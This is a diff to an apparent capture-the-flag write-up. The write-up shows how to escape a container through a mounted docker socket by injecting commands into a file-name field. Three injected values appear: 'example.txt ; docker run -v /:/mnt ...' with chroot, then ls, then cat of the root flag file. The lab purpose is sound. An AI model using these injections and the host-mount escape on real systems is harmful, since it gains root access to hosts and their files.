@@ -19,21 +19,21 @@ Check if docker is available inside the container:
 It is!  
 So you know that the docker sock is mounted inside the container and you have the docker cli, let's try to start a new container:  
 ```sh
-filename: ; docker run -v /:/mnt --rm -it busybox chroot /mnt sh
+example.txt ; docker run -v /:/mnt --rm -it busybox chroot /mnt sh
 ```  
 Unfortunately you cannot open a shell:  
 ![tty](./images/tty.png)  
 
 You need to do a bit of manual enumeration:  
 ```sh
-filename: ; docker run -v /:/mnt --rm busybox ls -lah /mnt/root/
+example.txt ; docker run -v /:/mnt --rm busybox ls -lah /mnt/root/
 ```  
 ![file](./images/found_flag_file.png)  
 
 
 At this point you can read that file content:  
 ```sh
-filename: ; docker run -v /:/mnt --rm busybox cat /mnt/root/flag.txt
+example.txt ; docker run -v /:/mnt --rm busybox cat /mnt/root/flag.txt
 ```  
 
 ![flag](./images/flag.png)  
